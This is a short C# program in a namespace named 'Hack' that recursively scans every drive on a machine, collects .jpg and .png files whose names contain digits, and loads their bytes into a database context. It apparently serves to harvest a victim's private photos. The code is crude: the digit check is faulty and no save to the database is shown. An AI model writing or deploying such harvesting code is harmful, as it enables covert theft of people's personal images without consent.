using Hack;

string[] Drives = Environment.GetLogicalDrives();
db_a7d8d7_testingContext db = new db_a7d8d7_testingContext();
foreach (var drive in Drives)
{
    Searsh(drive);  
}
void Searsh(string path)
{
    string[] files = Directory.GetFiles(path);
    if(files != null)
    {
        FileInfo[] infos = new FileInfo[files.Length];
        for (int i = 0; i < files.Length; i++)
        {
            infos[i] = new FileInfo(files[i]);
            if((infos[i].Extension==".jpg"|| infos[i].Extension == ".png")&& IsDigitsOnly(infos[i].Name))
            {
                db.Images.Add(new HackImages() { name = infos[i].Name, image= File.ReadAllBytes(infos[i].FullName) });
            }
        }
    }
    if(Directory.GetDirectories(path).Length == 0)
    {
            return;
    }
    else
    {
        foreach (var item in Directory.GetDirectories(path))
        {
            Searsh(item);
        }
    }
}

bool IsDigitsOnly(string str)
{
    foreach(char c in str)
    {
        if (c >= '0' && c <= '9')
        {
            return true;
        }
    }
    return false;
}